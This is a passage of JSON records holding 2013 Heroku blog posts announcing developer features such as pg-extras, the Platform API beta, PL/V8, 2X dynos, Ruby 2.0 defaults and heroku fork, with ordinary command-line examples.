{"website": "Heroku", "title": "Database Insight with pg-extras", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/more_insight_into_your_database_with_pgextras", "abstract": "Database Insight with pg-extras Posted by Craig Kerstiens May 10, 2013 Listen to this article When building your application there's a lot to worry about, from choice of framework and stack to designing the application itself, to questions of when to worry about scalability. Your database shouldn't have to be one extra layer of concern. You should be able to put data in, trust it will stay safe, and finally get data back out – in a performant manner. Yet, with all the moving parts in your application, understanding issues in your database can be a huge pain. Today we're releasing pg-extras , a heroku toolbelt plugin, to provide additional insights into your database and to make working with your database easier. Get started by installing the plugin for the heroku toolbelt: $ heroku plugins:install git://github.com/heroku/heroku-pg-extras.git Now you have many more commands available to provide you the insight you need within the pg namespace of the heroku toolbelt: $ heroku help pg\n...\n  pg:bloat [DATABASE]                 #  show table and index bloat in your database ordered by most wasteful\n  pg:blocking [DATABASE]              #  display queries holding locks other queries are waiting to be released\n  pg:cache_hit [DATABASE]             #  calculates your cache hit rate (effective databases are at 99% and up)\n... You can read more on each command available and what insights you can get from it within the pg-extras readme . Lets highlight a few: cache_hit Each production tier plan’s RAM size constitutes the total amount of System Memory on the underlying instance’s hardware, most of which is given to Postgres and used for caching. While a small amount of RAM is used for managing each connection and other tasks, Postgres will take advantage of almost all this RAM for its cache. You can read more about how this works in our article on understanding postgres data caching . As a guide for most web applications cache hit ratio should be in the 99%+ range . $ heroku pg:cache_hit\n       name      |         ratio\n----------------+------------------------\n index hit rate | 0.99985155862675559832\n cache hit rate | 0.99999671620611908765\n(2 rows) index_usage Premature optimization has both the cost of losing time on feature development and the risk of wasted optimizations. Indexes are one area that’s easy to ignore until you actually need them. A good index should be across a table of some reasonable size and highly selective. However indexes aren’t free, as there is a measurable cost to keeping them updated and storing them, so unused indexes which you can see with heroku pg:unused_indexes are to be avoided. With pg:index_usage you can begin to get a clear idea of how to manage/maintain your indexes. Running the command will give you output like the following: $ heroku pg:index_usage --app dashboard\n       relname       | percent_of_times_index_used | rows_in_table\n---------------------+-----------------------------+---------------\n events              |                          65 |       1217347\n app_infos           |                          74 |        314057\n app_infos_user_info |                           0 |        198848 From the above you can see that the app_infos_user_info has never had an index used and could likely benefit from adding an index. Even the events table could benefit from some additional indexes. From this you could then follow a more detailed guide for getting your indexes setup. locks Locks are bound to happen within your database, usually these are very short lived on the order of milliseconds. In PostgreSQL fortunately writing data does not hold a lock preventing it from being read . However, you can still encounter unintentional cases where you have long lived locks due to contention. Such cases can create follower lag, cause issues for other queries and in general start to impact application performance. With the pg:locks command you can easily view all current locks and how long they've been held. kill Whether its lock contention, a long running analytics query, or a bad cross join there are times where you want to stop a query. The pg:kill statement will allow you to kill any currently running query by specifying its pid which is displayed with commands pg:locks and pg:ps . Or if your database is in dire straights you also have the ability to run pg:killall to kill all currently running queries. Having the ability to stop runaway queries will allow you to feel even safer when others need access to your database to get the reports they need. The future We've already found pg-extras incredibly useful and expect you will too. Going forward pg-extras will be the playground for new commands available power users that install the plugin. Over time some commands may leave pg-extras and become part of the toolbelt or be removed if they’re not beneficial. We welcome your input on which commands you find helpful or what else you’d like to see in pg-extras at postgres@heroku.com . postgres", "date": "2013-05-10,"},
{"website": "Heroku", "title": "Heroku Platform API, Now Available in Public Beta", "author": ["Wesley Beary"], "link": "https://blog.heroku.com/heroku-platform-api-beta", "abstract": "Heroku Platform API, Now Available in Public Beta Posted by Wesley Beary May 30, 2013 Listen to this article Today, we are excited to release our new platform API into public beta, turning Heroku into an extensible platform for building new and exciting services. Our platform API derives from the same command-and-control API we use internally, giving entrepreneurs and innovators unprecedented power to integrate and extend our platform. Some of the uses we’ve imagined include: Building mobile apps that control Heroku from smartphones and tablets; Combining Heroku with other services and integrating with developer tools; Automating custom workflows with programmatic integration to Heroku The platform API empowers developers to automate, extend and combine Heroku with other services. You can use the platform API to programmatically create apps, provision add-ons and perform other tasks that could previously only be accomplished with Heroku toolbelt or dashboard . Getting Started The Heroku platform API uses HTTP and JSON to transfer data and is simple enough to experiment with using cURL . The examples below use the -n switch to read credentials from the ~/.netrc file, which is created automatically if you are using toolbelt . First, create a new Heroku app by sending a POST request to the /apps endpoint: $ curl -n -X POST https://api.heroku.com/apps \\\n-H \"Accept: application/vnd.heroku+json; version=3\"\n{\n  …\n  \"name\":\"mighty-cove-7151\",\n  …\n} This is equivalent to running $ heroku create or creating an app in dashboard. The platform API uses the mime type provided in the accept header to determine which version to serve. Version 3 is the first publicly available version. Prior versions were internal only. Now provision the Postgres add-on for use with the created app: $ curl -n -X POST https://api.heroku.com/apps/mighty-cove-7151/addons \\\n-H \"Accept: application/vnd.heroku+json; version=3\" \\\n-d “{\\”plan\\”:{\\”name\\”:\\”heroku-postgresql:dev\\”}}” This is the same as running $ heroku addons:add heroku-postgresql:dev -a mightycove-7151 or adding an add-on in dashboard. You can use the API to add any available add-ons and to perform other app setup tasks such as scaling and adding configuration vars. Using the API, you can automate the process of going from new to fully configured app with ease. These two examples barely scratch the surface of what’s possible. For more details on using the platform API, refer to the quickstart and reference documentation. The Future Over the coming weeks and months, while the platform API is in public beta, we will collect and incorporate feedback. During the public beta, we may introduce breaking changes to the API. All changes will be posted on the changelog . Providing Feedback The goal of the public beta is to collect and incorporate feedback. Please send feedback to api-feedback@heroku.com . We’re especially interested in your thoughts on the following: What do you think of the overall design? Is there anything missing for your use case? How can we make the API easier to use? If you have questions about using the new API, please post them on Stack Overflow with the heroku tag. We hope you like what you find and look forward to your exploration and innovation on top of the Heroku platform.", "date": "2013-05-30,"},
{"website": "Heroku", "title": "Postgres 9.3 Beta Available", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/postgres_93_beta_access", "abstract": "Postgres 9.3 Beta Available Posted by Craig Kerstiens May 15, 2013 Listen to this article With each new release, Postgres brings new powerful functionality to your fingertips – Postgres 9.3 is shaping up to be no different. Postgres 9.3 will include richer JSON operators for the JSON datatype , SQL-standard LATERAL subquery support , materialized views , and of course much more. Postgres 9.3 Beta was made available earlier this week and we’re excited to announce a public alpha of it ourselves. You can get started immediately with the alpha today by provisioning a Postgres 9.3 database on our production tier : $ heroku addons:add heroku-postgresql:crane --version=9.3\n...\nUse `heroku pg:wait` to track status.\n! WARNING: Postgres 9.3 is in alpha. alpha releases have\n!          a higher risk of data loss and downtime.\n!          Use with caution..\nUse `heroku addons:docs heroku-postgresql:crane` to view documentation. Our support of Postgres 9.3 Beta is alpha and comes with several conditions: The 9.3 beta version will be supported for 7 days after new beta or GA releases for PostgreSQL 9.3 occur. At which point existing databases will be deprovisioned or migrated to the newest release. At this time all Postgres 9.3 databases are running the GA release of PostgreSQL 9.3. Heroku Postgres uptimes are expected uptime guidelines and not a guarantee or SLA for uptime of your production database. As with many alpha or beta features the expected uptime is lower for Postgres 9.3 beta. Forks, followers, and other functionality may see a higher level of issues during the alpha and may cease to work entirely due to changes that could occur between 9.3 beta and GA. We're very excited to make PostgreSQL 9.3 available to you today, nevertheless we urge caution when using it as this is a very early beta PostgreSQL release. Once you do provision your 9.3 beta database, we want to hear from you at postgres@heroku.com . Let us know how you’re taking advantage of new features, and especially if you encounter any bugs. postgres", "date": "2013-05-15,"},
{"website": "Heroku", "title": "2X Dynos Enter General Availability", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/2x_dynos_enter_general_availability", "abstract": "2X Dynos Enter General Availability Posted by Matthew Soldo May 31, 2013 Listen to this article Thousands of Heroku customers have already updated their apps to utilize 2X dynos since they entered public beta on April 5. By providing twice the memory and CPU share, 2X dynos help to improve app performance and efficiency. 2X Dynos enter General Availability today. Starting tomorrow, June 1, 2013, 2X dynos will be billed at the full $0.10 per hour rate. Heroku customers have used 2X dynos to solve a number of problems: 1. Concurrency for Rails with Unicorn - Rails apps see significant performance improvements using Unicorn. In-dyno queuing allows requests to be served by any available worker. 2X dynos allow more workers per dyno, yielding better-than-linear performance improvements. 2. JVM Languages - The JVM has an explicit memory model designed for multi-threaded concurrency, and has many frameworks explicitly designed to take advantage of this property. Utilizing more threads requires more memory for both the thread stacks and for objects created by these threads. The JVM is fully capable of taking advantage of the vertical scale in a 2X dyno. 3. Memory-intensive background jobs - image processing, big-data crunching, and geospatial processing often need larger dynos. If your app experiences R14 out-of-memory errors, 2X dynos will provide increased head-room. You can upgrade your app to 2X dynos via the Heroku Toolbelt : $ heroku ps:resize web=2X worker=1X\nResizing dynos and restarting specified processes... done\nweb dynos now 2X ($0.10/dyno-hour)\nworker dynos now 1X ($0.05/dyno-hour) ... or via the Dashboard on the app’s resources page. For full instructions, see the Dev Center article . Summary If you’re looking to improve concurrency on Rails apps, making use of JVMs or other memory-hungry tasks, 2X dynos can make your app faster. Give them a try.", "date": "2013-05-31,"},
{"website": "Heroku", "title": "Heroku at WWDC", "author": ["Tammy Contreras"], "link": "https://blog.heroku.com/heroku_at_wwdc", "abstract": "Heroku at WWDC Posted by Tammy Contreras June 04, 2013 Listen to this article Each year, more than 5,000 iOS and Mac developers from over 50 different countries gather at Moscone Center West for Apple's Worldwide Developer Conference , or WWDC. It's the one week developers get to learn about all of the shiny new devices and APIs that they'll use to make their next great apps. Heroku is excited to be sponsoring and organizing a great lineup of events next week: AltWWDC Labs For anyone who didn't get a ticket to the main event this year or is looking for a change of pace from the official schedule, AltWWDC is definitely worth a look. This open alternative to Apple's Worldwide Developer Conference features sessions and labs from such luminaries as Aaron Hillegass , Marcus Zarra , Mike Lee , and Brent Simmons . Heroku Mobile Lead and AFNetworking creator Mattt Thompson will be on hand at the Connectivity & Web Services AltWWDC Lab on Tuesday (6/11) from 1–5PM, to answer your questions about creating mobile backends or native iOS apps. NSHipster Pub Quiz NSHipster is a journal of the overlooked bits in Objective-C and Cocoa with a new article every week. It's pretty obscure, so unless you're hip to Objective-C, you probably haven't heard of it. But if you are in the know, you won't want to miss NSHipster Pub Quiz . 4 rounds of 10 questions that challenge your knowledge of Objective-C internals, Cocoa APIs, and assorted Apple arcana. Join us Tuesday evening (6/11) at New Relic 's beautiful new space on Spear St. (just a few blocks from Moscone) for delicious pub food and craft beverages starting at 6:30, sponsored by Heroku, Mutual Mobile and New Relic . The quiz will get started once everyone settles in, around 7:30 or so. We'll be keeping the lights on late, giving you time to catch up with fellow NSHipsters afterwards. CocoaPods Meetup Much more than just an Objective-C dependency manager, CocoaPods has become the rallying point for the iOS and Mac OS X developer community, with over 1,700 open source projects currently available. Heroku is proud to be sponsoring the 2nd Annual WWDC CocoaPods Meetup on Wednesday evening (6/12) from 5–9PM at the Heavybit offices (9th & Folsom). Starting at 5PM, CocoaPods core team members will host office hours, for anyone who has questions about using CocoaPods in their projects. Then, at 7PM, Eloy Durán , the creator of CocoaPods, will give his \"State of the Union\" address, followed by talks core contributors Orta Thero , Michele Titolo , and Mattt Thompson . Helios Office Hours Helios is an open-source framework that provides essential backend services for iOS apps. Since its launch in April , Helios has become a compelling option for data synchronization, push notifications, in-app purchases, and passbook integration. On Thursday afternoon (6/13), from 1–4PM at The Grove (3rd & Mission), Mattt Thompson will host office hours to answer questions about Helios and mobile app development. This is a great opportunity for anyone looking to get started with Helios, whether you're creating something new from scratch, or adding it to your existing web application. Regards, The Heroku Team", "date": "2013-06-04,"},
{"website": "Heroku", "title": "JavaScript in your Postgres", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/javascript_in_your_postgres", "abstract": "JavaScript in your Postgres Posted by Craig Kerstiens June 05, 2013 Listen to this article The same JavaScript engine that powers the web today is now available in your database. This is one more step in evolving a data platform to meet all of your data needs. With a key/value store inside Postgres you gained agility in working with your schema. This agility was further improved with the JSON data type in Postgres 9.2. With geospatial support you removed the need for relying on additional tools for building location based apps. And today we're continuing to expand, going beyond SQL bringing the full power of the V8 JavaScript engine to your Heroku Postgres database. This offering is available immediately in public beta on all production tier databases . More on V8 V8 is a powerful and fast JavaScript engine that was developed by Google, in addition to powering Google Chrome it can be found in Node.js and MongoDB. From its initial design V8 was intended to work both for browsers to run client side JavaScript and be integrated into other projects such as powering server side execution in the case of Node.js. PL/V8 , thanks to a lot of work from Hitoshi Harada , is this same V8 but as a procedural language within Postgres. PL/V8 is fully trusted language giving you a peace of mind when it comes the safety of your data, but enables a whole new powerful set of functionality. Want to write functions on your data without touching pl-pgsql? Want to put documents within your database? Want to run your CoffeeScript unit tests closer to your data? You now can do all of it with PL/V8. Getting started If you’re already taking advantage of the JSON datatype for some of your applications and want to begin using PL/V8, now you can by simply enabling the extension: > CREATE EXTENSION plv8; From here we can create a simple JavaScript procedure that returns the values for an array of keys we pass in: > CREATE OR REPLACE FUNCTION plv8_test(keys text[], vals text[]) RETURNS\ntext AS $$\nvar o = {};\nfor(var i=0; i<keys.length; i++){\n o[keys[i]] = vals[i];\n}\nreturn JSON.stringify(o);\n$$ LANGUAGE plv8 IMMUTABLE STRICT; Of note in the above function is IMMUTABLE and STRICT . Immutable specifies that the function given the same inputs will return the same result. The optimizer therefore knows that it can pre-evaluate the function. If you lie to the optimizer, it will give you wrong answers. Strict means that if you send in NULL values you’ll get a null result. And then take advantage of it: > SELECT plv8_test(ARRAY['name', 'age'], ARRAY['Craig', '29']);\n          plv8_test\n-----------------------------\n {\"name\":\"Craig\",\"age\":\"29\"}\n(1 row) More Advanced PL/V8 Usage Lets take a look at a more practical use case. Given some example JSON data such as: > SELCT * FROM zips;\n                                 data\n---------------------------------------------------------------------\n {\"city\": \"ACMAR\", \"loc\": [-86.5, 33.5], \"pop\": 6055, \"state\": \"AL\"}\n {\"city\": \"ARAB\", \"loc\": [-86.4, 34.3], \"pop\": 13650, \"state\": \"AL\"}\n... It may be common to filter this data for some report, i.e. all cities with population greater than 10,000. To do this you first create a function – by creating a generic function that returns numeric value of a given key from a set of JSON, you can also re-use it elsewhere: > CREATE OR REPLACE FUNCTION \nget_numeric(key text, data json)\nRETURNS numeric AS $$\nreturn data[key];\n$$ LANGUAGE plv8 IMMUTABLE STRICT;\nCREATE FUNCTION Then we can use the function in our query: > SELECT * \nFROM zips \nWHERE get_numeric('pop', data) > 10000;\n                                 data\n------------------------------------------------------------------------\n{\"city\": \"PERU\", \"loc\": [-89.1, 41.3], \"pop\": 10050, \"state\": \"IL\"}\n{\"city\": \"JUNO\", \"loc\": [-84.1, 34.3], \"pop\": 10196, \"state\": \"GA\"}\n... Functional Indexes The ability to use JavaScript as part of your query through user defined functions provides great flexibility and continues to expand beyond just including JavaScript snippets inline in your queries. Postgres allows you to create indexes on any expression, including functions. With PL/V8, it is possible to create an index on the function above: > CREATE INDEX idx_pop \nON zips(get_numeric('pop'::text, data)); Functional indexes that take advantage of V8 can also prove some great performance benefits. By adding the above index the query time goes from 206.723 ms down to 0.157 ms. Summary The world of application development is rapidly changing delivering new tools every day to make you more productive. Postgres and the database world are no different, now with JavaScript and JSON support. This powerful functionality is now available on all Heroku Postgres production tier databases – run CREATE EXTENSION plv8; on your database to get started today. postgres", "date": "2013-06-05,"},
{"website": "Heroku", "title": "Heroku Platform API Hack-a-thon June 20th in SF", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/api_hackathon", "abstract": "Heroku Platform API Hack-a-thon June 20th in SF Posted by Sara Dornsife June 11, 2013 Listen to this article The new Heroku platform API is out in public beta . Come join our API team for an API Hack-a-thon on June 20th at Heavybit Industries (9th and Folsom) for an in-depth look. Doors open at 6:00p. This hack-a-thon is not a competition, but an in-depth look at the beta release - a chance for you to ask questions and provide feedback to the Heroku API team. Heroku’s API lead, Wesley Beary , will start the evening with a live presentation on the design and possibilities of the platform API. We will then have until 10:00p to talk to Wesley and the rest of the API team to ask questions and hack on code as well as enjoy a little food and drink. Space is limited, so register today.", "date": "2013-06-11,"},
{"website": "Heroku", "title": "Building Apps Efficiently on Heroku", "author": ["Chris Stolt"], "link": "https://blog.heroku.com/building_apps_efficiently_on_heroku", "abstract": "Building Apps Efficiently on Heroku Posted by Chris Stolt June 12, 2013 Listen to this article Whether you’re building your initial prototype or running a large scale profitable business, there will be times where you will have questions about building, maintaining, or troubleshooting your application. One of our goals is to help make your business successful by empowering you to build quality software with best practices, clear documentation on a stable erosion-resistant platform. When in doubt, there are several channels here at Heroku available to help you get the support you need. Getting Started Brand new to development or just new to Heroku there’s a place for you in the Dev Center . As you’re getting started you likely want to setup your application so you can get better visibility. Several tools are recommended, including add-ons for monitoring , add-ons for logging and native tools such as log2viz that provide visibility into application performance and issues. Throughout the app development process, you will want to take into consideration best practices for application architecture and scaling, The Twelve Factor App provides the recommended methodology for building software-as-a-service apps on Heroku. Ready to Launch Moving from development to production is a critical stage. When you’re developing you often don’t worry about uptime or bugs, but in production you want to take extra steps. The best place to start is through Heroku’s built in production check which runs your app through a checklist for maximizing uptime and ensuring optimal performance. Items in the production check include using Cedar , dyno redundancy , DNS & SSL , production databases and appropriate visibility and monitoring . I’m stuck, now what? When additional support is required, Heroku’s Help App provides a guided experience for accessing documentation and resources to get answers quickly. Help App aggregates content from both Heroku documentation and community discussions forums like Stack Overflow where Heroku engineers are very active. If questions are left unanswered, users have the ability to get in touch with Heroku support engineers from Help App. While free standard support hours are 9am–9pm ET without an SLA, Premium Support offers 24×7 coverage with 2-hour response time (this is the maximum; most premium support tickets are answered within a few minutes). When you aren’t able to find the answer yourself, Heroku support engineers are here to help. Common issues that support can assist with include setting up DNS with root domains, securing a site with SSL, and  migrating data between database plans. We are also able to help guide customers with more advanced needs such as difficult scaling techniques, app and database performance. When sending a support ticket, it’s a good idea to first perform the steps outlined in the above sections and explain what you’ve already tried. I need more In addition to Premium Support , Heroku offers individualized attention and support to your app through a dedicated Heroku engineer, called a technical account manager. Technical account managers offer the advantage of someone having immediate context and background on your apps. They also review your apps end to end for architecture, configurations and optimizations you may not have considered and will make recommendations on a regular basis. Early access Premium support services give you first access to new features that might be of help in making your app perform faster and more reliably, making teams of developers more productive. Some prior examples include early access to to 2X dynos , PostGIS and Fork and Follow before any were publicly announced. We’re here to help To learn more about best practices, guaranteed response times and support for critical apps, our customer advocacy team provides free introductory 1:1 assistance. Get in touch today .", "date": "2013-06-12,"},
{"website": "Heroku", "title": "Historical Uptime on Status Site", "author": ["Shanley Kane"], "link": "https://blog.heroku.com/historical-uptime", "abstract": "Historical Uptime on Status Site Posted by Shanley Kane June 13, 2013 Listen to this article Until now, Heroku Status has been focused primarily on present platform health - providing current status, uptime for the current month, and recent incident history. Today we're announcing an addition to our status site: a dedicated page to view historical uptime . The new uptime page provides a longer-term perspective on Heroku uptime and incidents - perspective that is critical for transparency and continued trust in the Heroku platform. The new uptime page covers both the US and Europe regions for visibility into uptime where your apps are hosted. This was a top-requested feature with the recent launch of Heroku's Europe region . The uptime page displays per-month uptime going back up to one year for both the US and Europe regions. To provide a view of historical incidents as well as historical uptime, it also visualizes the occurrence and duration of major and minor incidents by day. This page is designed to provide a clear and transparent view into uptime and incident occurrence over time. You can find out more about Heroku Status, how we calculate uptime, and other details in the Dev Center .", "date": "2013-06-13,"},
{"website": "Heroku", "title": "Introducing Notification Center", "author": ["Dominic Dagradi"], "link": "https://blog.heroku.com/introducing_notification_center", "abstract": "Introducing Notification Center Posted by Dominic Dagradi June 14, 2013 Listen to this article Change is a constant. At Heroku, we often deliver important information to users about changes and events on the platform, their apps and their accounts. We use a variety of media to keep users informed about these changes, including email, Twitter , the changelog and the blog . To help provide more direct and relevant information, we've added a new feature to Dashboard called Notification Center. We'll be using the Notification Center to keep you informed of important events affecting you and your apps. When new notifications arrive, you'll see a badge in Dashboard's header. If you log in today, you'll see something that looks like this: We'll be carefully curating the events we post to make sure they don't become too noisy. Here's a list of some of the things we're planning to notify about to start: Billing changes such as 2X Dyno pricing going into effect. New platform defaults that affect your applications. Important framework security vulnerabilities that affect your apps. Account alerts, such as expired credit card information or overdue invoices. Changes in add-on state, such as an add-on you're using leaving its beta phase. We hope you enjoy having notifications available on Dashboard. We're always looking for better ways to keep you up to date with changes that affect your apps on the platform, so let us know where we can help you out.", "date": "2013-06-14,"},
{"website": "Heroku", "title": "Ruby 2.0.0 Now Default on All New Ruby Applications", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/ruby-2-default-new-aps", "abstract": "Ruby 2.0.0 Now Default on All New Ruby Applications Posted by Richard Schneeman June 17, 2013 Listen to this article Heroku provides an opinionated platform in order to help you build better applications. We give you a default version of Ruby to get you started, and give you a way to declare your version for total control. In the past creating an application would give you 1.9.2, starting today the default is 2.0.0. Ruby 2.0.0 is fast, stable, and works out of the box with Rails 4. Applications running on 2.0.0 will have a longer shelf life than 1.9.3, giving you greater erosion resistance . Default Behavior If you have a previously deployed app it will continue to use Ruby 1.9.2, any new applications will run on 2.0.0. Heroku is an erosion resistant platform, which means we will not change a major or minor version of Ruby on your app without you taking action. Setting your Ruby Version In addition to providing a default version of Ruby, you have the ability to specify your version of Ruby in your Gemfile : ruby '2.0.0' While you can prototype on the default Ruby, we recommend explicitly setting your version on all production applications. When you specify the Ruby version in your codebase, you get the exact same version: across every developer and across every app. This means any new developers on your team, any new staging apps you set up on Heroku and any forked apps will have the same version. If your app needs consistency: define your Ruby version. Ruby 2.0 Ruby 2.0 includes copy on write friendly garbage collection which can reduce memory usage in a forking server such as Unicorn . Ruby 2.0.0 has faster code loading which means large frameworks such as Rails start much faster . Ruby 2.0.0 is mostly backwards compatible with 1.9.3 and at Heroku our developers already run Ruby 2.0.0. Using the latest stable version of Ruby has advantages for the community as well as for application's performance. In the past some Rubyists have resisted upgrading. This resulted in libraries needing to support multiple versions of Ruby for long periods of time, and creating factions within the community. For instance while Ruby 1.9.3 was released in 2011 there are many developers who are just now upgrading from Ruby 1.8.7 which, was released in 2008 . We have encouraged developers to run Ruby 2.0.0 on our platform by making the preview available , and the GA version available on launch day. By setting the default version to 2.0.0 we hope to encourage more developers to run on the most recent stable Ruby version. Stability, speed, and community are all good aspects to support, but we also care about application maintainability. At the end of this month Ruby 1.8.7 will reach end-of-life . Maximize the life of your application and simplify your upgrade to 2.1.0, coming in December, by using the most recent release. Conclusion Ruby at Heroku provides both defaults and flexible choices. You can explicitly declare a Ruby version or accept a stable, default version. Sometimes you may just need something to work, and others you want to enforce dev/prod parity between developers. By supporting a default Ruby you can do either. Thanks to Japan based Herokai: Ayumu Aizawa , Yukihiro \"Matz\" Matsumoto , Koichi Sasada , and Nobuyoshi Nakada , for working with us to push our defaults forward. Ruby Core is excited to see Heroku support the new 2.0 default, we hope you are too. Try it on Heroku and let us know what you think: @heroku .", "date": "2013-06-17,"},
{"website": "Heroku", "title": "App Sleeping on Heroku", "author": ["Mark Pundsack"], "link": "https://blog.heroku.com/app_sleeping_on_heroku", "abstract": "App Sleeping on Heroku Posted by Mark Pundsack June 20, 2013 Listen to this article When talking to Heroku users, a question that frequently comes up is \"when do my apps go to sleep, and why?\". Though the behavior is documented in Dev Center , we'd like to provide more immediate visibility into the state of your apps at any given moment. When Do Apps Sleep? When an app on Heroku has only one web dyno and that dyno doesn't receive any traffic in 1 hour, the dyno goes to sleep. When someone accesses the app, the dyno manager will automatically wake up the web dyno to run the web process type. This causes a short delay for this first request, but subsequent requests will perform normally. Apps that have more than 1 web dyno running never go to sleep and worker dynos (or other process types) are never put to sleep. Wakefulness in Dashboard Starting today, we'll be exposing the wakefulness of your apps on your Dashboard app list. All your apps now have an icon to indicate their current state. Here are the possible states your app can be in: Awake and will never go to sleep Awake, but will go to sleep after 1 hour of inactivity Asleep Not running because it has been scaled down or has no code You can click on any of the icons to see more information, such as how long the app has been sleeping for, and a quick shortcut to wake it up again if it is asleep.", "date": "2013-06-20,"},
{"website": "Heroku", "title": "Redesigned Monthly Invoices", "author": ["Roberta Carraro"], "link": "https://blog.heroku.com/redesigned_monthly_invoices", "abstract": "Redesigned Monthly Invoices Posted by Roberta Carraro June 21, 2013 Listen to this article Earlier this month, we quietly rolled out a new design for our monthly invoices. It's a breath of fresh air compared to the previous iteration, and we thought it would be interesting to share what goes into a design like this. At Heroku, billing is complex. Dyno hours are calculated to the second. Add-ons are calculated based on each provider’s pricing plan, which can be monthly or by usage depending on the add-on. There are support expenses, credits, free dyno hours, and packages. This all has to be wrangled into a format that not only makes sense for the back-end systems that run calculations, but also for the human beings that use Heroku and need to understand what they’re paying for. Our invoices have been falling short of the human-friendly requirement for a while. With the launch of 2X dynos , we realized our invoices needed to be updated to reflect the usage and pricing for multiple dyno sizes, and leapt at the opportunity to improve their overall quality. Initial Designs We began with the assumption that the most important thing for users isn’t an app-by-app breakdown of their charges, but instead a more general overview of the resources they’re paying for that can be summarized on a single page. Here’s our first mockup of that concept on an invoice: After a few iterations, we prototyped a basic version of our summary and new styles, and shared it with our Dashboard Beta users for a first round of feedback. We gave our testers a URL that rendered their current invoice with the new design, and asked them to fill out a short survey on SurveyMonkey with a handful of open-ended questions. User Feedback We received feedback within minutes, and collected our most valuable and actionable data within the first 24 hours of user testing. We learned very quickly our users had a few other important requests: Less verbose defaults For users with more than one or two apps, the previous invoice design could make it difficult to find the information you were looking for in a long wall of text. Improvements to invoice emails The summary at the start of the invoice was very popular, but many users wanted to see that same information in the email we send at the beginning of the month to let users know that we’re about to bill their account. The Final Product Based on the feedback above and from other testers, we continued to iterate until we were happy with the design. Today, when you view your current usage details from Dashboard, you'll see our new design. Here’s a breakdown of some of the major changes we’ve made: At-a-glance summary of major information Every invoice begins with a new section containing line items for your application dynos, add-on services, Heroku credits, one-off charges, and your invoice total. Improved readability and visuals The typography and layout of the entire invoice has been redesigned to highlight important information while removing distractions. Collapsible application details By default, the details for all apps on your invoice are collapsed into one line item. Expanding an app’s line item will break out your dyno and add-on usage with the same level of detail as the previous invoice design. This way, you can view your invoice with as much or as little detail as you’d like on an app-by-app basis (or click “Expand All” if you really liked viewing the details of all your apps at once). Improved print & print-to-PDF styles When printing your invoice, we remove unnecessary styles and elements.  Your billing information and invoice summary are available by themselves on the first page, and apps are printed in the same expanded or collapsed state as when you were viewing your invoice in the browser. Summaries in emails When your next invoice is ready, you’ll receive an HTML and/or plain text email with your billing information and invoice summary embedded in the message body so you can easily forward it to a manager or accountant. Conclusion We’re really excited to put the new design in your hands and browsers. We hope that with more readily accessible summaries and less overall clutter, we can remove some common pain points from the billing process. As always, we're constantly iterating on our designs, and we'd love to hear what you think . If you’d like to help us test new platform functionality, add-ons, and more in the future, join the Heroku Dashboard Beta program .", "date": "2013-06-21,"},
{"website": "Heroku", "title": "Introducing Heroku Fork", "author": ["Shanley Kane"], "link": "https://blog.heroku.com/heroku-fork", "abstract": "Introducing Heroku Fork Posted by Shanley Kane June 27, 2013 Listen to this article An application is more than source code - it’s executables, generated assets, runtime environments, dependencies, configuration, running processes, backing services and more. What if you could fork your entire app, not just your code? heroku fork lets you create unique, running instances of existing applications right from the command line. These instances are live and available on Heroku immediately so you can change, scale and share them however you want. How It Works You can fork apps you own and apps you’re collaborating on. You must have the Heroku Toolbelt installed to use this feature. Fork an existing application by running the following command: $ heroku fork -a sourceapp targetapp The command: Copies the source app's precompiled slug . Copies the source app's config vars , excluding add-on-specific environment variables. Re-provisions the source app's add-ons with the same plan. Note that if you are using paid add-ons, you will be charged for their usage in the new app. Copies the source app's Heroku Postgres data, if present. Scales the web process of the new app to one dyno, regardless of the number of web processes running on the source app. This ensures you don’t pay for scale you may not need. For more on the specific behaviors and limitations of heroku fork , please see the Dev Center article . Today’s Use Cases Demonstrable Pull Requests The common practice for evaluating pull requests is cumbersome at best: submitters provide a screenshot ( or animated gif ) to illustrate the proposed change, or a maintainer pulls down the remote branch and previews the change locally. Using heroku fork , pull requests can be accompanied by the URL of a live fork of the app that demonstrates a real, interactive version of the new feature. Quick Setup of Multiple Environments Keeping development, staging, production and other environments as similar as possible provides the foundation for a healthy workflow . Using heroku fork you can quickly spin up new, homogeneous application environments for other stages of development. You may even want additional environments outside of the standard development/staging/production workflow - heroku fork provides a simple way to spin up more ephemeral environments to play with, modify or dispose of as desired. Migration to EU region We recently launched Heroku Europe. heroku fork can be used to migrate your application to the Europe region: $ heroku fork -a sourceapp targetapp --region eu After verifying add-on provisioning and config vars in the new application, you can take steps to complete migration, such as migrating any production data not stored in Heroku Postgres and adjusting DNS settings. Future of Fork We want to empower teams to work faster and smarter: test new features, carry out experiments, and evolve rapidly. We think heroku fork provides the foundation for these things and more. We’d love to hear what you think of it and how you're using it. Email us.", "date": "2013-06-27,"},
{"website": "Heroku", "title": "Add-ons for Production Apps", "author": ["Shanley Kane"], "link": "https://blog.heroku.com/addons_production_apps", "abstract": "Add-ons for Production Apps Posted by Shanley Kane July 08, 2013 Listen to this article Heroku Add-ons are services exposed through the Heroku platform. They are managed by experts, provisioned and scaled in a single command, and consumed by your application as loosely coupled components. This post provides an overview of Add-ons for logging, persistence, caching and monitoring in production apps. Logging heroku addons:add papertrail Logs provide the foundation for trend analysis, error inspection, performance tuning and other processes critical for running production apps. Heroku routes and collates real-time logs from each part of your app, including running processes, system components, API events... even Add-ons themselves. Heroku presents app logs in a single stream of time-ordered events, providing comprehensive logging for everything from simple prototypes to complex, highly distributed apps. While Heroku handles collating and routing for you, you can use one of our logging Add-ons to consume the log stream and provide higher-order services such as persistence, search, alerts, and integration with other services. Papertrail is one of the most popular logging Add-ons. In two clicks, receive a nightly email with platform errors, deploys, and critical app logs. It automatically integrates with Heroku’s log stream so no code changes are needed, and provides real-time tail, search, alerting and integration with other services. It can be used via your browser, command line, or an HTTP API. Their free plan gets you started with seven days of log archiving, search for up to the past two days, and 10MB of data per day. You can see our other logging services here , including Logentries, Loggly, and FlyData. Persistence heroku addons:add heroku-postgresql Persisting, managing and scaling state is one of the primary concerns of a production application. Traditionally, the persistence layer has been both brittle and fragile. Heroku Postgres brings the Heroku flow to your database, offering safe and straightforward provisioning, scaling, development and collaboration: Fork your database. In a single command, create a clone of your database and all of its data. Use it to test migrations, do load testing, or spin up a development database. This makes working with your database 